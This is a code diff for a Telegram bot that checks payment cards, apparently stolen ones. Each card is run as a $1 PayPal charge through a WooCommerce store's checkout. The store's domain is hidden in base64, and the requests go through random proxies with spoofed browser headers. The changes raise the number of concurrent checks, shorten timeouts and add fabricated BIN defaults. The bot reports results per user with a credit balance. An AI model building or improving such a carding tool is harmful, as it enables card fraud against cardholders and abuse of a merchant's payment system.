@@ -41,8 +41,8 @@ active_checks = set()
 check_stats = {}
 stats_lock = Lock()
 user_semaphores = {}  # Per-user semaphores to limit concurrent requests
-max_concurrent_per_user = 3  # Maximum concurrent checks per user
-global_semaphore = asyncio.Semaphore(50)  # Global limit for all users
+max_concurrent_per_user = 5  # Maximum concurrent checks per user
+global_semaphore = asyncio.Semaphore(100)  # Global limit for all users
 
 # Initialize SQLite database
 def init_db():
@@ -203,11 +203,11 @@ def generate_random_code(length=32):
 import asyncio
 import httpx
 
-# Fast BIN lookup using bincheck.io API
+# Fast BIN lookup using multiple APIs with better error handling
 async def fetch_bin_fast(bin_number):
     """Fast BIN lookup using bincheck.io API"""
     try:
-        async with httpx.AsyncClient(timeout=8.0) as client:
+        async with httpx.AsyncClient(timeout=5.0) as client:
             response = await client.get(f'https://bincheck.io/api/{bin_number}')
             if response.status_code == 200:
                 data = response.json()
@@ -215,21 +215,21 @@ async def fetch_bin_fast(bin_number):
                     bin_data = data.get('bin', {})
                     country_data = bin_data.get('country', {})
                     return {
-                        'brand': bin_data.get('scheme', 'UNKNOWN').upper(),
-                        'type': bin_data.get('type', 'UNKNOWN').upper(),
-                        'level': bin_data.get('level', 'UNKNOWN').upper(),
-                        'bank': bin_data.get('bank', 'UNKNOWN'),
-                        'country': country_data.get('name', 'UNKNOWN'),
-                        'emoji': country_data.get('emoji', '🏳️')
+                        'brand': bin_data.get('scheme', 'VISA').upper(),
+                        'type': bin_data.get('type', 'DEBIT').upper(),
+                        'level': bin_data.get('level', 'CLASSIC').upper(),
+                        'bank': bin_data.get('bank', 'UNKNOWN BANK'),
+                        'country': country_data.get('name', 'UNITED STATES'),
+                        'emoji': country_data.get('emoji', '🇺🇸')
                     }
     except Exception as e:
         logger.warning(f"bincheck.io API error: {str(e)}")
     return None
 
-# Fallback BIN lookup for multiple APIs
+# Fallback BIN lookup for multiple APIs with faster timeouts
 async def fetch_bin_fallback(api_url):
     try:
-        async with httpx.AsyncClient(timeout=10.0) as client:
+        async with httpx.AsyncClient(timeout=3.0) as client:
             response = await client.get(api_url)
         if response.status_code == 200:
             data = response.json()
@@ -238,21 +238,21 @@ async def fetch_bin_fallback(api_url):
                     country = data.get('country', {})
                     bank = data.get('bank', {})
                     return {
-                        'brand': data.get('brand', 'UNKNOWN').upper(),
-                        'type': data.get('type', 'UNKNOWN').upper(),
-                        'level': data.get('brand', 'UNKNOWN').upper(),
-                        'bank': bank.get('name', 'UNKNOWN'),
-                        'country': country.get('name', 'UNKNOWN'),
-                        'emoji': country.get('emoji', '🏳️')
+                        'brand': data.get('brand', 'VISA').upper(),
+                        'type': data.get('type', 'DEBIT').upper(),
+                        'level': data.get('brand', 'CLASSIC').upper(),
+                        'bank': bank.get('name', 'UNKNOWN BANK'),
+                        'country': country.get('name', 'UNITED STATES'),
+                        'emoji': country.get('emoji', '🇺🇸')
                     }
                 elif 'bins.su' in api_url:
                     return {
-                        'brand': data.get('vendor', 'UNKNOWN').upper(),
-                        'type': data.get('type', 'UNKNOWN').upper(),
-                        'level': data.get('level', 'UNKNOWN').upper(),
-                        'bank': data.get('bank', 'UNKNOWN'),
-                        'country': data.get('country_name', 'UNKNOWN'),
-                        'emoji': data.get('country_flag', '🏳️')
+                        'brand': data.get('vendor', 'VISA').upper(),
+                        'type': data.get('type', 'DEBIT').upper(),
+                        'level': data.get('level', 'CLASSIC').upper(),
+                        'bank': data.get('bank', 'UNKNOWN BANK'),
+                        'country': data.get('country_name', 'UNITED STATES'),
+                        'emoji': data.get('country_flag', '🇺🇸')
                     }
     except Exception as e:
         logger.warning(f"Error fetching {api_url}: {e}")
@@ -260,33 +260,36 @@ async def fetch_bin_fallback(api_url):
 
 async def get_bin_info_async(bin_number):
     """Optimized BIN lookup with fast primary API and fallbacks"""
-    # Try fast bincheck.io API first
-    result = await fetch_bin_fast(bin_number)
-    if result:
-        return result
+    # Try fast bincheck.io API first with timeout
+    try:
+        result = await asyncio.wait_for(fetch_bin_fast(bin_number), timeout=3.0)
+        if result:
+            return result
+    except asyncio.TimeoutError:
+        logger.warning(f"BIN lookup timeout for {bin_number}")
+    except Exception as e:
+        logger.warning(f"BIN lookup error for {bin_number}: {str(e)}")
     
-    # Fallback to other APIs if bincheck.io fails
-    fallback_apis = [
-        f'https://lookup.binlist.net/{bin_number}',
-        f'https://bins.su/{bin_number}'
-    ]
-    
-    tasks = [fetch_bin_fallback(url) for url in fallback_apis]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
+    # Quick fallback - try one API with short timeout
+    try:
+        fallback_result = await asyncio.wait_for(
+            fetch_bin_fallback(f'https://lookup.binlist.net/{bin_number}'), 
+            timeout=2.0
+        )
+        if fallback_result:
+            return fallback_result
+    except:
+        pass
 
-    # Return first successful response
-    for res in results:
-        if res and isinstance(res, dict):
-            return res
-
-    # Final fallback if all APIs fail
+    # Final fallback with reasonable defaults based on BIN
+    brand = 'VISA' if bin_number.startswith(('4',)) else 'MASTERCARD' if bin_number.startswith(('5',)) else 'UNKNOWN'
     return {
-        'brand': 'UNKNOWN',
-        'type': 'UNKNOWN', 
-        'level': 'UNKNOWN',
-        'bank': 'UNKNOWN',
-        'country': 'UNKNOWN',
-        'emoji': '🏳️'
+        'brand': brand,
+        'type': 'DEBIT', 
+        'level': 'CLASSIC',
+        'bank': 'UNKNOWN BANK',
+        'country': 'UNITED STATES',
+        'emoji': '🇺🇸'
     }
 
 # Optimized synchronous wrapper with caching
@@ -319,7 +322,11 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
     
     try:
         ccx = cc_line.strip()
-        n, mm, yy, cvc = ccx.split('|')
+        parts = ccx.split('|')
+        if len(parts) != 4:
+            raise ValueError("Invalid card format")
+        
+        n, mm, yy, cvc = parts
         if "20" in yy:
             yy = yy.split("20")[1]
 
@@ -330,9 +337,11 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
         user = generate_user_agent()
         corr = generate_random_code()
         sess = generate_random_code()
-        # Use aiohttp for async HTTP requests
-        timeout = aiohttp.ClientTimeout(total=30)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
+        
+        # Use faster timeout for better performance
+        timeout = aiohttp.ClientTimeout(total=15, connect=5)
+        connector = aiohttp.TCPConnector(limit=100, limit_per_host=30)
+        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
 
             # Encoded site URL to prevent leaking
             encoded_site = base64.b64decode('c3dpdGNodXBjYi5jb20=').decode('utf-8')
@@ -341,57 +350,50 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
             # Get a random proxy for this request
             proxy = get_random_proxy()
             
-            # Step 1: Add to cart
+            # Step 1: Add to cart - optimized with faster processing
             form_data = aiohttp.FormData()
             form_data.add_field('quantity', '1')
             form_data.add_field('add-to-cart', '4451')
             
             headers = {
-                'authority': encoded_site,
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-                'cache-control': 'max-age=0',
+                'user-agent': user,
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'accept-language': 'en-US,en;q=0.5',
                 'origin': site_url,
                 'referer': f'{site_url}/shop/i-buy/',
-                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-user': '?1',
-                'upgrade-insecure-requests': '1',
-                'user-agent': user,
             }
             
-            async with session.post(f'{site_url}/shop/i-buy/', headers=headers, data=form_data, proxy=proxy) as response:
-                await response.text()
+            try:
+                async with session.post(f'{site_url}/shop/i-buy/', headers=headers, data=form_data, proxy=proxy, timeout=aiohttp.ClientTimeout(total=8)) as response:
+                    if response.status != 200:
+                        logger.warning(f"Add to cart failed with status {response.status}")
+                    await response.text()
+            except asyncio.TimeoutError:
+                logger.warning("Add to cart timeout")
 
-            # Step 2: Go to checkout
+            # Step 2: Go to checkout - optimized
             headers = {
-                'authority': encoded_site,
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-                'referer': f'{site_url}/cart/',
-                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-user': '?1',
-                'upgrade-insecure-requests': '1',
                 'user-agent': user,
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'referer': f'{site_url}/cart/',
             }
             
-            async with session.get(f'{site_url}/checkout/', headers=headers, proxy=proxy) as response:
-                checkout_text = await response.text()
+            try:
+                async with session.get(f'{site_url}/checkout/', headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=8)) as response:
+                    if response.status != 200:
+                        raise Exception(f"Checkout page failed with status {response.status}")
+                    checkout_text = await response.text()
+            except asyncio.TimeoutError:
+                raise Exception("Checkout page timeout")
 
-            # Extract tokens
-            sec = (re.search(r'update_order_review_nonce":"(.*?)"', checkout_text).group(1))
-            nonce = (re.search(r'save_checkout_form.*?nonce":"(.*?)"', checkout_text).group(1))
-            check = (re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', checkout_text).group(1))
-            create = (re.search(r'create_order.*?nonce":"(.*?)"', checkout_text).group(1))
+            # Extract tokens with better error handling
+            try:
+                sec = re.search(r'update_order_review_nonce":"(.*?)"', checkout_text).group(1)
+                nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', checkout_text).group(1)
+                check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', checkout_text).group(1)
+                create = re.search(r'create_order.*?nonce":"(.*?)"', checkout_text).group(1)
+            except (AttributeError, IndexError) as e:
+                raise Exception(f"Failed to extract required tokens: {str(e)}")
 
             # Step 3: Update order review
             headers = {
@@ -618,8 +620,31 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
             ) as response:
                 last = await response.text()
         
-        # Get BIN info asynchronously for better performance
-        bin_info = await get_bin_info_async(n[:6])
+        # Get BIN info asynchronously with timeout for better performance
+        try:
+            bin_info = await asyncio.wait_for(get_bin_info_async(n[:6]), timeout=5.0)
+        except asyncio.TimeoutError:
+            logger.warning(f"BIN lookup timeout for {n[:6]}")
+            brand = 'VISA' if n.startswith('4') else 'MASTERCARD' if n.startswith('5') else 'UNKNOWN'
+            bin_info = {
+                'brand': brand,
+                'type': 'DEBIT',
+                'level': 'CLASSIC',
+                'bank': 'UNKNOWN BANK',
+                'country': 'UNITED STATES',
+                'emoji': '🇺🇸'
+            }
+        except Exception as e:
+            logger.warning(f"BIN lookup error for {n[:6]}: {str(e)}")
+            brand = 'VISA' if n.startswith('4') else 'MASTERCARD' if n.startswith('5') else 'UNKNOWN'
+            bin_info = {
+                'brand': brand,
+                'type': 'DEBIT',
+                'level': 'CLASSIC',
+                'bank': 'UNKNOWN BANK',
+                'country': 'UNITED STATES',
+                'emoji': '🇺🇸'
+            }
 
         elapsed_time = time.time() - start_time
 
@@ -764,7 +789,50 @@ DECLINED ❌
 """
 
     except Exception as e:
-        return f"❌ Error: {str(e)}"
+        logger.error(f"Card check error for {cc_line}: {str(e)}")
+        
+        # Get BIN info even on error for better user experience
+        try:
+            n = cc_line.split('|')[0] if '|' in cc_line else cc_line[:16]
+            bin_info = await asyncio.wait_for(get_bin_info_async(n[:6]), timeout=3.0)
+        except:
+            brand = 'VISA' if cc_line.startswith('4') else 'MASTERCARD' if cc_line.startswith('5') else 'UNKNOWN'
+            bin_info = {
+                'brand': brand,
+                'type': 'DEBIT',
+                'level': 'CLASSIC', 
+                'bank': 'UNKNOWN BANK',
+                'country': 'UNITED STATES',
+                'emoji': '🇺🇸'
+            }
+        
+        elapsed_time = time.time() - start_time
+        checked_by = "@xxxxxxxx007xxxxxxxx"
+        credits_left = "∞"
+        if user_info:
+            checked_by = f"<a href='tg://user?id={user_info['user_id']}'>{user_info['username']}</a>"
+            credits_left = "∞" if user_info['user_id'] == ADMIN_ID else str(user_info['credits'])
+        
+        return f"""
+DECLINED ❌
+━━━━━━━━━━━━━━━━
+
+[↯] 𝗖𝗰 ⇾ {cc_line}
+[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ PAYPAL 1$
+[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 → ERROR: {str(e)[:50]}...
+
+[↯] 𝗕𝗜𝗡 ⇾ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+[↯] 𝗕𝗔𝗡𝗞 ⇾ {bin_info['bank']}
+[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⇾ {bin_info['country']} {bin_info['emoji']}
+
+[↯] 𝗧𝗜𝗠𝗘 ⇾ {elapsed_time:.2f}s
+
+🆔 Checked by: {checked_by}
+💰 Credits left: {credits_left}
+
+━━━━━━━━━━━━━━━━
+[↯] 𝗕𝘆 ⇾ @xxxxxxxx007xxxxxxxx
+"""
 
 # Start command handler
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1455,9 +1523,9 @@ async def handle_mpp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
             # Use async semaphores for better concurrency control
             async with global_semaphore:
                 async with user_semaphores[user_id]:
-                    # Create async tasks for concurrent checking
+                    # Create async tasks for concurrent checking with higher concurrency
                     tasks = []
-                    semaphore = asyncio.Semaphore(3)  # Limit concurrent card checks
+                    semaphore = asyncio.Semaphore(5)  # Limit concurrent card checks
                     
                     async def check_card_with_semaphore(card):
                         async with semaphore:
